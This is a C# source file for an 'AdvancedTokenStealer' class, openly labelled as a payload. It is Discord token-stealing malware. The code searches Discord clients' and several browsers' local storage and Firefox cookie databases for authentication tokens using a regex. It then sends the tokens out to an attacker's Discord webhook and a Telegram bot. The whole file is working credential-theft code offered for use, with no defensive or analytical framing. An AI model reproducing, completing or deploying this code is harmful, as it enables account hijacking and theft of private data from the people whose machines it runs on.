using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Configuration;
using System.Threading.Tasks;
using System.Linq;

// THIS IS JUST A PAYLOAD WITHOUT THE INTERFACE

public class AdvancedTokenStealer
{
    public static async Task RunTokenGrabber()
    {
        string webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";
        StringBuilder stolenTokens = new StringBuilder();

        // 1. Discord-Tokens
        stolenTokens.AppendLine("=== Discord Tokens ===");
        stolenTokens.AppendLine(GetDiscordTokens());

        // 2. Browser-Tokens (more browser)
        stolenTokens.AppendLine("=== Browser Tokens ===");
        stolenTokens.AppendLine(await GetEnhancedBrowserTokens());

        // Debug-Output
        Console.WriteLine("Found Tokens:\n" + stolenTokens);

        // 3. Send if there is a token
        if (!string.IsNullOrWhiteSpace(stolenTokens.ToString().Replace("===", "").Trim()))
        {
            await SendToWebhook(webhookUrl, stolenTokens.ToString());
        }
        else
        {
            Console.WriteLine("Keine Tokens gefunden!");
        }
    }

    // ===== [1] DISCORD-TOKENS ===== //
    private static string GetDiscordTokens()
    {
        StringBuilder tokens = new StringBuilder();
        string[] discordPaths = new[]
        {
            // Discord Clients
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Discord", "Local Storage", "leveldb"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DiscordCanary", "Local Storage", "leveldb"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DiscordPTB", "Local Storage", "leveldb"),
            // Browser (falls Discord im Browser läuft)
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Vivaldi", "User Data", "Default", "Local Storage", "leveldb")
        };

        foreach (var path in discordPaths)
        {
            if (!Directory.Exists(path))
            {
                Console.WriteLine($"[!] Discord-path not found: {path}");
                continue;
            }

            foreach (var file in Directory.GetFiles(path, "*.ldb").Concat(Directory.GetFiles(path, "*.log")))
            {
                try
                {
                    string content = File.ReadAllText(file);
                    var matches = Regex.Matches(content, @"(mfa\.[\w-]{84}|[\w-]{24,30}\.[\w-]{6}\.[\w-]{27,40})");

                    foreach (Match match in matches)
                    {
                        if (!tokens.ToString().Contains(match.Value))
                        {
                            Console.WriteLine($"[+] Discord-Token found ({Path.GetFileName(file)}): {match.Value}");
                            tokens.AppendLine(match.Value);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] read error {Path.GetFileName(file)}: {ex.Message}");
                }
            }
        }

        return tokens.ToString();
    }

   // ADvanced Browser Token
    private static async Task<string> GetEnhancedBrowserTokens()
    {
        StringBuilder tokens = new StringBuilder();
        string[] browsers = new[]
        {
            // Chrome-based
            "Google\\Chrome",
            "Microsoft\\Edge",
            "BraveSoftware\\Brave-Browser",
            "Vivaldi",
            "Opera Software\\Opera Stable",
            "Mozilla\\Firefox"
        };

        foreach (var browser in browsers)
        {
            string browserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), browser);
            
            if (browser.Contains("Firefox"))
            {
                tokens.AppendLine(await GetFirefoxTokens());
            }
            else if (Directory.Exists(browserPath))
            {
                // Chrome/Edge/Opera/Brave/Vivaldi
                string leveldbPath = Path.Combine(browserPath, "User Data", "Default", "Local Storage", "leveldb");
                tokens.AppendLine(SearchLevelDB(leveldbPath));
            }
        }

        return tokens.ToString();
    }

    private static string SearchLevelDB(string path)
    {
        StringBuilder tokens = new StringBuilder();
        if (!Directory.Exists(path)) return "";

        foreach (var file in Directory.GetFiles(path, "*.ldb").Concat(Directory.GetFiles(path, "*.log")))
        {
            try
            {
                string content = File.ReadAllText(file);
                var matches = Regex.Matches(content, @"(mfa\.[\w-]{84}|[\w-]{24,30}\.[\w-]{6}\.[\w-]{27,40})");

                foreach (Match match in matches)
                {
                    if (!tokens.ToString().Contains(match.Value))
                    {
                        Console.WriteLine($"[+] Browser-Token found ({Path.GetFileName(file)}): {match.Value}");
                        tokens.AppendLine(match.Value);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] read error {Path.GetFileName(file)}: {ex.Message}");
            }
        }

        return tokens.ToString();
    }

    private static async Task<string> GetFirefoxTokens()
    {
        StringBuilder tokens = new StringBuilder();
        string firefoxPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles");

        if (!Directory.Exists(firefoxPath)) return "";

        foreach (var profileDir in Directory.GetDirectories(firefoxPath))
        {
            string cookiesPath = Path.Combine(profileDir, "cookies.sqlite");
            if (File.Exists(cookiesPath))
            {
                try
                {
                    // (SQLite needs System.Data.SQLite)
                    string content = File.ReadAllText(cookiesPath);
                    var matches = Regex.Matches(content, @"(mfa\.[\w-]{84}|[\w-]{24,30}\.[\w-]{6}\.[\w-]{27,40})");

                    foreach (Match match in matches)
                    {
                        if (!tokens.ToString().Contains(match.Value))
                        {
                            Console.WriteLine($"[+] Firefox-Token found: {match.Value}");
                            tokens.AppendLine(match.Value);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Firefox-Fehler: {ex.Message}");
                }
            }
        }

        return tokens.ToString();
    }

    // (Discord + Telegram)
    private static async Task SendToWebhook(string webhookUrl, string content)
    {
        string telegramBotId = ConfigurationManager.AppSettings["TelegramBotId"] ?? "";
        string telegramChatId = ConfigurationManager.AppSettings["TelegramChatId"] ?? "";

        using (HttpClient client = new HttpClient())
        {
            // Discord
            if (!string.IsNullOrEmpty(webhookUrl) && webhookUrl.StartsWith("https://discord.com/api/webhooks/"))
            {
                try
                {
                    var discordPayload = new { content = content };
                    var discordJson = Newtonsoft.Json.JsonConvert.SerializeObject(discordPayload);
                    var response = await client.PostAsync(webhookUrl, new StringContent(discordJson, Encoding.UTF8, "application/json"));
                    Console.WriteLine(response.IsSuccessStatusCode ? "[+] Discord-Webhook erfolgreich!" : $"[!] Discord-Fehler: {response.StatusCode}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Discord-Exception: {ex.Message}");
                }
            }

            // Telegram
            if (!string.IsNullOrEmpty(telegramBotId) && !string.IsNullOrEmpty(telegramChatId))
            {
                try
                {
                    var telegramUrl = $"https://api.telegram.org/bot{telegramBotId}/sendMessage";
                    var telegramPayload = new { chat_id = telegramChatId, text = content };
                    var telegramJson = Newtonsoft.Json.JsonConvert.SerializeObject(telegramPayload);
                    var response = await client.PostAsync(telegramUrl, new StringContent(telegramJson, Encoding.UTF8, "application/json"));
                    Console.WriteLine(response.IsSuccessStatusCode ? "[+] Telegram erfolgreich!" : $"[!] Telegram-Fehler: {response.StatusCode}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Telegram-Exception: {ex.Message}");
                }
            }
        }
    }
}
